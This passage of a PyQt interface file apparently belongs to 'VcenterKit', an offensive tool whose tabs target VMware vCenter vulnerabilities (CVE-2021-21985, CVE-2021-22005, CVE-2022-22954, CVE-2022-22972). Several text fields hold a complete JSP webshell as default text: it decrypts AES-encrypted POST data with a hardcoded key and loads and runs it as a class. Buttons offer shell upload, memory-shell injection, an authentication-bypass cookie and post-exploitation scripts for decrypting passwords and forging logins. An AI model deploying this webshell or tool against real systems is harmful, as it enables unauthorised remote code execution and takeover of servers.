"<p style=\" margin-top:6px; margin-bottom:6px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:10pt;\">&lt;%@page import=&quot;java.util.</span><span style=\" font-size:10pt; font-style:italic;\">,javax.crypto.</span><span style=\" font-size:10pt;\">,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)){String k= &quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init( 2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta ce().equals(pageContext);}%&gt;</span></p></body></html>"))
        self.cve_2021_21985_target_shell_name_label.setText(_translate("MainWindow", "Shell Name:"))
        self.cve_2021_21985_shell_name_text.setPlaceholderText(_translate("MainWindow", " Example: shell.jsp"))
        self.cve_2021_21985_target_shell_upload_path_label.setText(_translate("MainWindow", "Specified Upload Path:\n"
"         (optional)"))
        self.cve_2021_21985_shell_upload_path_text.setPlaceholderText(_translate("MainWindow", " Example: /usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/41/0/h5ngc.war/resources/"))
        self.groupBox.setTitle(_translate("MainWindow", "Optional Mode"))
        self.cve_2021_21985_shell_upload_button.setText(_translate("MainWindow", "Shell Upload\n"
"(probably successful )"))
        self.cve_2021_21985_inject_memory_shell_button.setText(_translate("MainWindow", "Inject Memory Shell\n"
"(probably successful )"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.cve_2021_21985), _translate("MainWindow", "CVE-2021-21985"))
        self.cve_2021_22005_result_groupbox.setTitle(_translate("MainWindow", "Result"))
        self.cve_2021_22005_result_text.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'Courier New\'; font-size:12pt; font-weight:400; font-style:normal;\">\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p></body></html>"))
        self.cve_2021_22005_target_groupbox.setTitle(_translate("MainWindow", "Target"))
        self.cve_2021_22005_target_url_label.setText(_translate("MainWindow", "Target Url:    "))
        self.cve_2021_22005_target_url_text.setPlaceholderText(_translate("MainWindow", " Example: https://vcenter.example.com"))
        self.cve_2021_22005_target_shell_label.setText(_translate("MainWindow", "Shell:"))
        self.cve_2021_22205_target_shell_text.setMarkdown(_translate("MainWindow", "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U\n"
"extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return\n"
"super.defineClass(b,0,b.length);}}%><%if\n"
"(request.getMethod().equals(\"POST\")){String k=\n"
"\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher\n"
"c=Cipher.getInstance(\"AES\");c.init( 2,new\n"
"SecretKeySpec(k.getBytes(),\"AES\"));new\n"
"U(this.getClass().getClassLoader()).g(c.doFinal(new\n"
"sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta\n"
"ce().equals(pageContext);}%>\n"
"\n"
""))
        self.cve_2021_22205_target_shell_text.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:6px; margin-bottom:6px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:10pt;\">&lt;%@page import=&quot;java.util.</span><span style=\" font-size:10pt; font-style:italic;\">,javax.crypto.</span><span style=\" font-size:10pt;\">,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)){String k= &quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init( 2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta ce().equals(pageContext);}%&gt;</span></p></body></html>"))
        self.cve_2021_22005_target_check.setText(_translate("MainWindow", "1. check"))
        self.cve_2021_22005_target_exploit.setText(_translate("MainWindow", "2. exploit"))
        self.cve_2021_22005_target_shell_name_label.setText(_translate("MainWindow", "Shell Name:"))
        self.cve_2021_22005_target_shell_name_text.setPlaceholderText(_translate("MainWindow", " Example: shell.jsp"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.cve_2021_22005), _translate("MainWindow", "CVE-2021-22005"))
        self.cve_2022_22954_result_groupbox.setTitle(_translate("MainWindow", "Result"))
        self.cve_2022_22954_result_text.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'Courier New\'; font-size:12pt; font-weight:400; font-style:normal;\">\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p></body></html>"))
        self.cve_2022_22954_target_groupbox.setTitle(_translate("MainWindow", "Target"))
        self.cve_2022_22954_target_url_label.setText(_translate("MainWindow", "Target Url:"))
        self.cve_2022_22954_target_url_text.setPlaceholderText(_translate("MainWindow", " Example: https://vcenter.example.com"))
        self.cve_2022_22954_target_command_label.setText(_translate("MainWindow", "Command:"))
        self.cve_2022_22954_target_command_text.setMarkdown(_translate("MainWindow", "whoami\n"
"\n"
""))
        self.cve_2022_22954_target_command_text.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'SimSun\'; font-size:12pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:8px; margin-bottom:8px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">whoami</p></body></html>"))
        self.cve_2022_22954_target_check_button.setText(_translate("MainWindow", "1. check"))
        self.cve_2022_22954_exploit_button.setText(_translate("MainWindow", "2. exploit"))
        self.cve_2022_22954_target_shell_label.setText(_translate("MainWindow", "Shell:"))
        self.cve_2022_22954_target_shell_name_text.setPlaceholderText(_translate("MainWindow", " Example: shell.jsp"))
        self.cve_2022_22954_target_shell_text.setMarkdown(_translate("MainWindow", "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U\n"
"extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return\n"
"super.defineClass(b,0,b.length);}}%><%if\n"
"(request.getMethod().equals(\"POST\")){String k=\n"
"\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher\n"
"c=Cipher.getInstance(\"AES\");c.init( 2,new\n"
"SecretKeySpec(k.getBytes(),\"AES\"));new\n"
"U(this.getClass().getClassLoader()).g(c.doFinal(new\n"
"sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta\n"
"ce().equals(pageContext);}%>\n"
"\n"
""))
        self.cve_2022_22954_target_shell_text.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:6px; margin-bottom:6px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:10pt;\">&lt;%@page import=&quot;java.util.</span><span style=\" font-size:10pt; font-style:italic;\">,javax.crypto.</span><span style=\" font-size:10pt;\">,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)){String k= &quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init( 2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta ce().equals(pageContext);}%&gt;</span></p></body></html>"))
        self.cve_2022_22954_target_shell_name_label.setText(_translate("MainWindow", "Shell Name:"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.cve_2022_22954), _translate("MainWindow", "CVE-2022-22954"))
        self.cve_2022_22972_result_groupbox.setTitle(_translate("MainWindow", "Result"))
        self.cve_2022_22972_result_text.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'Courier New\'; font-size:12pt; font-weight:400; font-style:normal;\">\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p></body></html>"))
        self.cve_2022_22972_target_groupbox.setTitle(_translate("MainWindow", "Target"))
        self.cve_2022_22972_target_url_label.setText(_translate("MainWindow", "Target Url:    "))
        self.cve_2022_22972_target_url_text.setPlaceholderText(_translate("MainWindow", " Example: https://vcenter.example.com"))
        self.cve_2022_22972_get_cookie_button.setText(_translate("MainWindow", "Get the bypass cookie!"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.cve_2022_22972), _translate("MainWindow", "CVE-2022-22972"))
        self.py_script_generate_groupbox.setTitle(_translate("MainWindow", "Generation of python script"))
        self.vhost_password_decrypt_button.setText(_translate("MainWindow", "Generate the python script <vhost_password_decrypt.py>"))
        self.vcenter_saml_login_button.setText(_translate("MainWindow", "Generate the python script <vcenter_saml_login.py>"))
        self.vcenter_saml_login_target_button.setText(_translate("MainWindow", "Generate the python script <vCenter_ExtraCertFromMdb.py>\n"
"\n"
"and <vCenter_GenerateLoginCookie.py."))
        self.vcenter_ldap_manage_button.setText(_translate("MainWindow", "Generate the python script <vCenterLDAP_Manage.py>"))
        self.py_script_generate_result_groupbox.setTitle(_translate("MainWindow", "Result"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.post_exploitation_utilizaiton_groupbox), _translate("MainWindow", "Post-exploitation comprehensive utilization"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.pentest_notebook_groupbox), _translate("MainWindow", "Pentest Notebook"))
        self.menuProxy.setTitle(_translate("MainWindow", "Proxy"))
        self.menuAbout.setTitle(_translate("MainWindow", "About"))
        self.actionAdd_Proxy_For_Vcenterit.setText(_translate("MainWindow", "Add Proxy For VcenterKit"))
        self.actionAbout_the_author.setText(_translate("MainWindow", "About the author"))
        self.actionhelp.setText(_translate("MainWindow", "help"))

if __name__ == "__main__":
    QtCore.QCoreApplication.processEvents()
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())